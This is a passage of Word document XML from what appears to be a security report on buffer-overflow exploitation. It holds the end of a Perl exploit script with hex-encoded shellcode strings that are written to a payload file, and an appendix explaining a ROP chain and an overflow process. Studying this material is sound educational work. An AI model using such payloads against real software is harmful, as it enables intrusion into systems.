              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x35\x43\x52\x52\x4f\x43\x48\x45\x38\x43\x43\x52\x53\x43" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="725DFEB6" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x51\x45\x37\x43\x58\x43\x51\x47\x50\x52\x4d\x43\x55\x43" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B018A73" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x58\x51\x30\x52\x49\x54\x33\x51\x30\x45\x38\x51\x44\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25291AD9" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x48\x43\x59\x43\x43\x50\x31\x49\x59\x4b\x38\x50\x4c\x47" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34F7ABBB" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x54\x45\x4d\x4d\x59\x4d\x31\x50\x31\x4e\x32\x51\x42\x50" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C8407EB" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x53\x56\x31\x51\x42\x4b\x4f\x4e\x30\x56\x51\x49\x50\x50" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="103073D4" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x50\x4b\x4f\x51\x45\x54\x48\x41\x41";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DD83AFF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5B5C1E34" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="77FF9B5C" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>open($FILE,"&gt;$file1");</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23F81CE6" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>print $FILE $buffer;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71A0F607" w14:textId="00795C6E" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>close($FILE);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="657376C5" w14:textId="218AD997" w:rsidR="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66CA3132" w14:textId="75CE45F8" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="055F3023" w14:textId="3822E9A8" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E6A922C" w14:textId="46165968" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6270C930" w14:textId="28396713" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D341F17" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00C14656" w:rsidRDefault="00734785" w:rsidP="00C14656">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CCD4578" w14:textId="222FADFF" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="70" w:name="_Toc103326496"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix C - </w:t>
      </w:r>
      <w:r w:rsidR="00BA18EC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Visualisations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="70"/>
    </w:p>
    <w:p w14:paraId="5DE96ADB" w14:textId="0495ABCD" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="71" w:name="_Toc103326497"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>C1 - ROP Chains</w:t>
      </w:r>
      <w:bookmarkEnd w:id="71"/>
    </w:p>
    <w:p w14:paraId="02F0FC1D" w14:textId="278E795B" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>In this scenario, the goal is to get ESP to 66 and EAX to 4, choosing the correct memory locations and order of commands in the stack to achieve this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B83B0E4" w14:textId="52EA6282" w:rsidR="000F4B5C" w:rsidRDefault="00C34234" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:object w:dxaOrig="1440" w:dyaOrig="1440" w14:anchorId="0DDEA59B">
          <v:shape id="_x0000_s1032" type="#_x0000_t75" style="position:absolute;margin-left:167.25pt;margin-top:1.9pt;width:114.35pt;height:224.1pt;z-index:251707392;mso-position-horizontal-relative:text;mso-position-vertical-relative:text;mso-width-relative:page;mso-height-relative:page" wrapcoords="-109 0 -109 21545 21600 21545 21600 0 -109 0">
            <v:imagedata r:id="rId41" o:title=""/>
            <w10:wrap type="tight"/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_s1032" DrawAspect="Content" ObjectID="_1714027415" r:id="rId42"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6167B2" w14:textId="35D3FC38" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="207FC10B" w14:textId="601D8E86" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68F1881D" w14:textId="14FFADC9" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FBAA50E" w14:textId="265AC3EF" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="031B63FF" w14:textId="4CD7DBA4" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="101210A7" w14:textId="20159AA1" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77D9E2A9" w14:textId="7CD954DE" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3899C302" w14:textId="7DDAEF07" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E262E97" w14:textId="77777777" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0795BFAB" w14:textId="77777777" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5310CE70" w14:textId="5C005282" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>This can be done using the following commands from the stack</w:t>
      </w:r>
      <w:r w:rsidR="009F5231">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> upwards</w:t>
      </w:r>
      <w:r w:rsidR="00DD1017">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, which point the program to </w:t>
      </w:r>
      <w:r w:rsidR="00503D1E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>instruction locations</w:t>
      </w:r>
      <w:r w:rsidR="00DD1017">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the memory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506947C3" w14:textId="4144BD4E" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="00DD1017">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7EB8E2C6" wp14:editId="1EA613CE">
            <wp:extent cx="4200525" cy="32272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02170" cy="3228497"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="051F4370" w14:textId="77777777" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="00DD1017">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="094E70D7" w14:textId="41A12CDD" w:rsidR="00DD1017" w:rsidRDefault="00DD1017" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>See below for a full breakdown of how this process would work, along with an explanation of each step.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F42F6AC" w14:textId="700425F0" w:rsidR="00DD1017" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:r>
        <w:object w:dxaOrig="11130" w:dyaOrig="5475" w14:anchorId="7A439AE7">
          <v:shape id="_x0000_i1029" type="#_x0000_t75" style="width:392.9pt;height:193.55pt" o:ole="">
            <v:imagedata r:id="rId44" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1029" DrawAspect="Content" ObjectID="_1714027409" r:id="rId45"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="131AEE6B" w14:textId="62B07A0A" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:r>
        <w:object w:dxaOrig="10500" w:dyaOrig="5760" w14:anchorId="510D0B9B">
          <v:shape id="_x0000_i1030" type="#_x0000_t75" style="width:385.35pt;height:210.8pt" o:ole="">
            <v:imagedata r:id="rId46" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1030" DrawAspect="Content" ObjectID="_1714027410" r:id="rId47"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="381AC135" w14:textId="6A30622B" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:r>
        <w:object w:dxaOrig="11340" w:dyaOrig="5370" w14:anchorId="28745B79">
          <v:shape id="_x0000_i1031" type="#_x0000_t75" style="width:395.75pt;height:186.9pt" o:ole="">
            <v:imagedata r:id="rId48" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1031" DrawAspect="Content" ObjectID="_1714027411" r:id="rId49"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3300BC" w14:textId="08B00278" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="000F4B5C"/>
    <w:p w14:paraId="635B64B9" w14:textId="77777777" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="686A190D" w14:textId="6D3BA5DE" w:rsidR="00DD1017" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:r>
        <w:object w:dxaOrig="11625" w:dyaOrig="5385" w14:anchorId="1E3D4C8E">
          <v:shape id="_x0000_i1032" type="#_x0000_t75" style="width:467.9pt;height:216.75pt" o:ole="">
            <v:imagedata r:id="rId50" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1032" DrawAspect="Content" ObjectID="_1714027412" r:id="rId51"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="24571A6E" w14:textId="5982A37E" w:rsidR="009F5231" w:rsidRDefault="009F5231" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:object w:dxaOrig="11415" w:dyaOrig="5565" w14:anchorId="6BE520EC">
          <v:shape id="_x0000_i1033" type="#_x0000_t75" style="width:466.3pt;height:227.35pt" o:ole="">
            <v:imagedata r:id="rId52" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1033" DrawAspect="Content" ObjectID="_1714027413" r:id="rId53"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8DB436" w14:textId="6856C709" w:rsidR="00DD1017" w:rsidRDefault="00DD1017" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C3BB019" w14:textId="136A3433" w:rsidR="000F4B5C" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Toc103326498"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251719680" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7824EFEC" wp14:editId="42EF0DD6">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-457200</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>295275</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6835140" cy="3847465"/>
            <wp:effectExtent l="0" t="0" r="3810" b="635"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21497"/>
                <wp:lineTo x="21552" y="21497"/>
                <wp:lineTo x="2155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835140" cy="3847465"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>C2 - Steflan Overflow Process</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
    </w:p>
    <w:p w14:paraId="6C613C60" w14:textId="70F7D611" w:rsidR="00503D1E" w:rsidRPr="00503D1E" w:rsidRDefault="00C34234" w:rsidP="00503D1E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-1591922422"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00585AA4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00585AA4">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve">CITATION Ste21 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00585AA4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00585AA4" w:rsidRPr="00585AA4">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Lanaro, 2021)</w:t>
          </w:r>
          <w:r w:rsidR="00585AA4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:sectPr w:rsidR="00503D1E" w:rsidRPr="00503D1E" w:rsidSect="004D7B3D">
      <w:footerReference w:type="default" r:id="rId55"/>
      <w:footerReference w:type="first" r:id="rId5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11123D" w14:textId="77777777" w:rsidR="00C34234" w:rsidRDefault="00C34234" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="75ED8878" w14:textId="77777777" w:rsidR="00C34234" w:rsidRDefault="00C34234" w:rsidP="004E73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5816108"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="1E8A0C48" w14:textId="4CC21C40" w:rsidR="0082349D" w:rsidRDefault="0082349D">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
        </w:pPr>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="55ED7A65" w14:textId="32C73005" w:rsidR="008F0E02" w:rsidRDefault="008F0E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8859836"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="6D543C67" w14:textId="77777777" w:rsidR="008F0E02" w:rsidRDefault="00D11AE8">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
          <w:pBdr>
            <w:top w:val="single" w:sz="4" w:space="1" w:color="D9D9D9" w:themeColor="background1" w:themeShade="D9"/>
          </w:pBdr>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
        </w:pPr>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008F0E02">
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="008F0E02" w:rsidRPr="00A60D20">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidR="008F0E02">
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r w:rsidR="008F0E02">
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="539E26F0" w14:textId="77777777" w:rsidR="008F0E02" w:rsidRDefault="008F0E0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9717893"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="01CF75C4" w14:textId="77777777" w:rsidR="008F0E02" w:rsidRDefault="00D11AE8" w:rsidP="003363BE">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
          <w:pBdr>
            <w:top w:val="single" w:sz="4" w:space="1" w:color="D9D9D9" w:themeColor="background1" w:themeShade="D9"/>
          </w:pBdr>
          <w:jc w:val="right"/>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
        </w:pPr>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008F0E02">
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00587075" w:rsidRPr="00587075">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
